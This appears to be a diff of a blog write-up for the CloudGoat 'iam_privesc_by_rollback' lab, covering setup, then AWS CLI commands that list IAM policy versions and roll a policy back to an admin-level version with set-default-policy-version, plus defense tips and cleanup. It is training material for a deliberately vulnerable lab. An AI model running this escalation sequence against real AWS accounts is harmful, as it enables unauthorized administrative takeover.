@@ -19,7 +19,7 @@ tags:  [AWS, IAM, PRIVILEGE ESCALATION, Cloudgoat]
 > This content demonstrates defensive security research with proper authorization.
 > Never test security vulnerabilities against systems you don’t own or have explicit permission to assess.
 > Always follow your organization’s cloud security policies and AWS’s Acceptable Use Policy.
-> Protect your keys like passwords—exposing them risks account compromise.
+> Protect your keys like passwords, exposing them risks account compromise.
 
 ## The Danger Lurking in Your Policy History
 
@@ -49,6 +49,8 @@ Base Environment
 ### Tools Required for This Scenario
 1. AWS CLI (to interact with AWS APIs)
 2. Git (to clone CloudGoat)
+> Kali Linux includes Git by default. 
+> For other distros, install it with: **sudo apt install git -y**
 3. Python 3.8+ & Poetry (for CloudGoat dependencies)
 4. jq (optional, for parsing JSON outputs)
 
@@ -78,7 +80,7 @@ sudo ./aws/install
 
 Here is what a successful Installation looks like, verifying with commands like: 
 ```bash
-aws –version or
+aws --version or
 which aws
 ```
 ![SuccessfullyInstalledCLI](/assets/images/CloudGoat/AWSCLI_Installed.png)
@@ -190,3 +192,118 @@ poetry run python3 -m cloudgoat.cloudgoat create iam_privesc_by_rollback --profi
 ```
 Once the scenario is loaded successfully, you expect to see something like this:
 ![ScenarioLoaded](/assets/images/CloudGoat/ScenarioLoaded.png)
+
+That sums up the Lab setup for this scenario.
+
+## Understanding the Vulnerability: IAM Privilege Escalation via Policy Rollback
+### What's Happening?
+A low-privilege IAM user has a policy that was tightened over time. An older version of the policy exists with admin privileges (due to accidental rollback vulnerability).
+> Our Goal: Find and revert to the older policy version to escalate privileges.
+
+### Step 1: Configure AWS CLI with Low-Privilege Credentials
+Use the discovered credentials for the scenario user by running the following commands as shown:
+![SettingDiscoveredCreds](/assets/images/CloudGoat/SettingDiscoveredCreds.png)
+
+Verify that this worked by running:
+```bash
+aws sts get-caller-identity
+```
+You should see the following if it was successful:
+![VerifyingSetCreds](/assets/images/CloudGoat/VerifyingSetCreds.png)
+
+### Step 2: Check Current Permissions
+You can use a command like the one below, or make necessary modifications as per your scenario:
+```bash
+aws iam list-attached-user-policies --user-name raynor-cgidi8wcl1r3py
+```
+Your output should look like so:
+![CurrentPermissions](/assets/images/CloudGoat/CurrentPermissions.png)
+
+### Step 3: List Policy Versions
+The vulnerability lies in older policy versions. Let's list them:
+```bash
+aws iam list-policy-versions \
+    --policy-arn "arn:aws:iam::637423228247:policy/cg-raynor-policy-cgidogjjitpasx"
+```
+You should see something like this:
+![Versions](/assets/images/CloudGoat/Versions.png)
+
+### Step 4: Retrieve Older Policy Versions
+Check permissions in each version (especially older ones), I was particularly interested in V1 because it stands out:
+
+```bash
+aws iam get-policy-version \
+    --policy-arn "arn:aws:iam::637423228247:policy/cg-raynor-policy-cgidogjjitpasx" \
+    --version-id "v1"
+```
+Expected output:
+![AdminPolicyV1](/assets/images/CloudGoat/AdminPolicyV1.png)
+
+## Analyzing the Dangerous Policy
+
+This IAM policy is very interesting, and dangerous, from a security perspective. It's explicitly crafted to allow privilege escalation via the "rollback" method. Let’s break it down.
+**iam:Get* + iam:List*:** Allows reading IAM configurations
+These permissions allow:
+- Reading IAM users, roles, groups, and policies.
+- Listing all versions of a given policy.
+- Identifying any old policy versions that might have more powerful permissions.
+This visibility is key for enumeration during privilege escalation.
+
+**iam:SetDefaultPolicyVersion**: Allows rolling back to previous policy versions
+This is the most critical and potentially dangerous permission.
+It allows a user to:
+- Roll back a managed IAM policy to an earlier version, even if that version has AdministratorAccess orsome other over-permissive access.
+- The rollback doesn't change the policy, it just sets a previously approved version as the default.
+
+This is a classic IAM Privilege Escalation Technique:
+- Assume the attacker has access to a role or user attached to a managed policy.
+- That policy originally granted admin privileges (e.g., in version 1).
+- Later, it was restricted (e.g., in version 5).
+- The attacker uses **iam:SetDefaultPolicyVersion** to revert to version 1.
+- Now their user/role has admin access, without modifying the policy directly.
+
+That is exactly what we are going to do when we run the first command below.
+### Executing the Privilege Escalation
+```bash
+aws iam set-default-policy-version \
+    --policy-arn "arn:aws:iam::637423228247:policy/cg-raynor-policy-cgidogjjitpasx" \
+    --version-id "v1"
+```
+A blank or empty output means that this rollback was successful. We can verify this by running the command(s) below:
+```bash
+aws iam get-policy-version \
+ --policy-arn "arn:aws:iam::637423228247:policy/cg-raynor-policycgidogjjitpasx" \
+ --version-id "v1"
+aws sts get-caller-identity
+aws iam list-users
+```
+To prove this was a successful PE vector using the old policy, we can see if we are still in the context of our current user and if they can do something the admin only is allowed to do, like listing the IAM users.
+![PE](/assets/images/CloudGoat/PE.png)
+
+Let’s try and list the IAM users since we have already escalated our privileges:
+```bash
+aws sts get-caller-identity
+aws iam list-users
+```
+The output should look like this:
+![ListingUsers](/assets/images/CloudGoat/ListingUsers.png)
+
+## Why This Worked:
+- The policy was tightened over time, but older versions weren’t deleted.
+- The user had **iam:SetDefaultPolicyVersion** permission (a common misconfiguration).
+
+That sum's up the objectives or goals that we had for this particular lab.
+
+## Defense Recommendations:
+- Always delete old policy versions when updating IAM policies.
+- Never grant **iam:SetDefaultPolicyVersion** to low-privilege users.
+
+To clean up, run:
+```bash
+poetry run python3 -m cloudgoat.cloudgoat destroy iam_privesc_by_rollback --
+profile default
+aws configure set aws_access_key_id "" && aws configure set
+aws_secret_access_key ""
+```
+
+Happy hacking, see you on the next post.
